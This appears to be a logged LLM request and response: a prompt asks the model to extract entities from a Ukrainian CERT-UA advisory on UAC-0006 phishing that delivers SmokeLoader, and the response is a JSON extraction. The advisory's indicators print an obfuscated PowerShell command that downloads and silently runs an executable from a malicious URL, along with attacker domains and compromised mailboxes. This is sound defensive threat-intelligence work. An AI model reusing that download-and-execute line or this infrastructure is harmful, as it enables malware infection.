@@ -1,0 +1,316 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><em>Оновлено 12.05.2023</em></p><p><br></p><p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено факт розповсюдження електронних листів з використанням скомпрометованих облікових записів з темою "рахунку/оплати" із додатком у вигляді ZIP-архіву.</p><p>Згаданий ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл "pax_2023_AB1058..js", який, використовуючи PowerShell, забезпечить завантаження та запуск виконуваного файлу "portable.exe". Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader (дата компіляції: 2023-04-24 11:45:17). Персистентність запуску SmokeLoader буде забезпечено шляхом створення запланованого завдання, наприклад: "C:\Windows\System32\Tasks\<strong>Firefox Default Browser Agent D0D690C3E3EC0AB0</strong>".</p><p>Дати реєстрації доменних імен, а також дата компіляції файлу свідчать про те, що кампанію ініційовано у квітні 2023 року.&nbsp;</p><p>Слід зауважити, що активність групи UAC-0006 є фінансово-мотивованою та здійснювалась з 2013 року по липень 2021 року. Типовий зловмисний задум полягає в ураженні ЕОМ бухгалтерів (за допомогою яких здійснюється забезпечення фінансової діяльності, наприклад, доступ до систем дистанційного банківського обслуговування), викраденні автентифікаційних даних (логін, пароль, ключ/сертифікат) та створенні несанкціонованих платежів (в деяких випадках з використанням HVNC боту, безпосередньо з ураженої ЕОМ).</p><p>Ураховуючи той факт, що згаданою групою на етапі первинного ураження типово використовуються JavaScript-завантажувачі, тимчасово мінімізувати вірогідність ураження можливо шляхом блокування запуску wscript.exe (Windows Script Host) на ЕОМ. Для цього, зокрема, в гілку реєстру "{HKEY_CURRENT_USER,HKEY_LOCAL_MACHINE}\Software\Microsoft\Windows Script Host\Settings" необхідно додати запис "Enabled" (тип: DWORD) зі значенням "0".&nbsp;</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">3de79fc46c7f32807397309d52001b25&nbsp; &nbsp; 352974cfdf1a7e182180f8c813a159ae44bb35268d76fae91ab64139be9200bd&nbsp; &nbsp; pax_2023_ab1058.zip
+ef40fca1afe6ae5320cf396a736718ad&nbsp; &nbsp; 3c4440dde25ead7074bf3bf90aed31844310c3f1da90ff7e20922fad4c3eab25&nbsp; &nbsp; pax_2023_AB1058.pdf
+12f77d1be4344fb88f1093550b092ab6&nbsp; &nbsp; f4e72685fb3efa5bad200451d36c7d1e72a94515c515bdbb09c00254dca289ea&nbsp; &nbsp; pax_2023_ab1058..js
+68bc4ce7b6c15f1f5a40e361b2214fce&nbsp; &nbsp; 24471f2fd20e7386aa533b51bf851cdeb9ee0750a615273c6004b86e463d36d2&nbsp; &nbsp; portable.exe
+8f05b8ea15b88c441219cf8310010df0&nbsp; &nbsp; cd0226a2b9c38ab99f2bbe4461b7fc9d4b07faafbe1ccc53d92bf08d1903a8ae&nbsp; &nbsp; portable.exe
+185efba2b3bf87e7d49a05ebb0ad5114&nbsp; &nbsp; 7ee1ab4270a5293e7151a6321ce17962022802f72a7d58c264e43a016a8a49a4&nbsp; &nbsp; smoke.exe (SmokeLoader)
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%TMP%\gEq94.exe
+%TMP%\gE94.exe
+%LOCALAPPDATA%\TempgE94.exe
+%LOCALAPPDATA%\TempgEq94.exe
+%APPDATA%\cajvchh (назва файлу змінна)
+"C:\Windows\System32\WScript.exe" "%USERPROFILE%\Downloads\pax_2023_AB1058..js"&nbsp;
+"C:\Windows\System32\cmd.exe" /c pO^wErshEll -executionpolicy bypass -noprofile -w hidden $v1='Net.We'; $v2='bClient'; $var = (New-Object $v1$v2); $var.Headers['User-Agent'] = 'Google Chrome'; $var.downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe'); &amp; %%temp%%gEq94.exe &amp; ZJHYOcunksxSdyp
+C:\Windows\System32\Tasks\Firefox Default Browser Agent D0D690C3E3EC0AB0
+Firefox Default Browser Agent D0D690C3E3EC0AB0
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">beliy@atl.ua (скомпрометований обліковий запис)
+inbox6@dl.kr-admin.gov.ua (скомпрометований обліковий запис)
+nvn@mayak.dp.ua (скомпрометований обліковий запис)
+hXXp://homospoison[.]ru/one/portable.exe
+hXXp://3dstore[.]pro/
+hXXp://balkimotion[.]ru/
+hXXp://coudzoom[.]ru/
+hXXp://criticalosl[.]tech/
+hXXp://humanitarydp[.]ug/
+hXXp://ipodromlan[.]ru/
+hXXp://lamazone[.]site/
+hXXp://ligaspace[.]ru/
+hXXp://maximprofile[.]net/
+hXXp://redport80[.]ru/
+hXXp://shopersport[.]ru/
+hXXp://sindoproperty[.]org/
+hXXp://superboler[.]com/
+hXXp://zaliphone[.]com/
+3dstore[.]pro
+balkimotion[.]ru
+coudzoom[.]ru
+criticalosl[.]tech
+homospoison[.]ru
+humanitarydp[.]ug
+ipodromlan[.]ru
+lamazone[.]site
+ligaspace[.]ru
+maximprofile[.]net
+redport80[.]ru
+shopersport[.]ru
+sindoproperty[.]org
+superboler[.]com
+zaliphone[.]com
+193[.]106.175.177
+Google Chrome (User-Agent)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (6.9s, in 3717 / out 2031 tok, STOP) ===
+UAC-0006 is a financially motivated threat group that conducted a phishing campaign in April 2023 delivering SmokeLoader via polyglot ZIP archives containing malicious JavaScript scripts and decoy documents.
+
+{
+  "entities": [
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cyber threat group active against Ukrainian organizations."
+    },
+    {
+      "name": "SmokeLoader",
+      "kind": "malware",
+      "gloss": "A modular malware loader used to download and execute secondary malicious payloads."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software product",
+      "gloss": "An automation technology for Microsoft Windows operating systems that provides scripting capabilities."
+    },
+    {
+      "name": "pax_2023_ab1058.zip",
+      "kind": "computer file",
+      "gloss": "A malicious polyglot archive file distributed via phishing emails."
+    },
+    {
+      "name": "pax_2023_AB1058.pdf",
+      "kind": "computer file",
+      "gloss": "A decoy document file contained in the malicious archive."
+    },
+    {
+      "name": "pax_2023_ab1058..js",
+      "kind": "computer file",
+      "gloss": "A malicious JavaScript loader script executing PowerShell commands."
+    },
+    {
+      "name": "portable.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable file responsible for launching SmokeLoader."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "computer file",
+      "gloss": "An executable payload of the SmokeLoader malware."
+    },
+    {
+      "name": "beliy@atl.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "inbox6@dl.kr-admin.gov.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "nvn@mayak.dp.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "hxxp://homospoison[.]ru/one/portable.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL used to download the portable.exe executable."
+    },
+    {
+      "name": "homospoison[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used for malicious payload distribution."
+    },
+    {
+      "name": "3dstore[.]pro",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "balkimotion[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "coudzoom[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "criticalosl[.]tech",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "humanitarydp[.]ug",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "ipodromlan[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "lamazone[.]site",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "ligaspace[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "maximprofile[.]net",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "redport80[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "shopersport[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "sindoproperty[.]org",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "superboler[.]com",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "zaliphone[.]com",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "193[.]106.175.177",
+      "kind": "ip address",
+      "gloss": "An IP address associated with threat actor network infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "uses",
+      "tail": "SmokeLoader",
+      "evidence": "здійснить запуск шкідливої програми SmokeLoader ... активність групи UAC-0006"
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_ab1058..js",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл \"pax_2023_AB1058..js\""
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_AB1058.pdf",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку"
+    },
+    {
+      "head": "pax_2023_ab1058..js",
+      "type": "uses",
+      "tail": "PowerShell",
+      "evidence": "JavaScript-файл \"pax_2023_AB1058..js\", який, використовуючи PowerShell"
+    },
+    {
+      "head": "pax_2023_ab1058..js",
+      "type": "delivers",
+      "tail": "portable.exe",
+      "evidence": "забезпечить завантаження та запуск виконуваного файлу \"portable.exe\""
+    },
+    {
+      "head": "portable.exe",
+      "type": "delivers",
+      "tail": "SmokeLoader",
+      "evidence": "Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "hxxp://homospoison[.]ru/one/portable.exe",
+      "type": "hosts",
+      "tail": "portable.exe",
+      "evidence": "$var.downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe')"
+    },
+    {
+      "head": "homospoison[.]ru",
+      "type": "hosts",
+      "tail": "hxxp://homospoison[.]ru/one/portable.exe",
+      "evidence": "hxxp://homospoison[.]ru/one/portable.exe"
+    }
+  ],
+  "newRelationTypes": []
+}
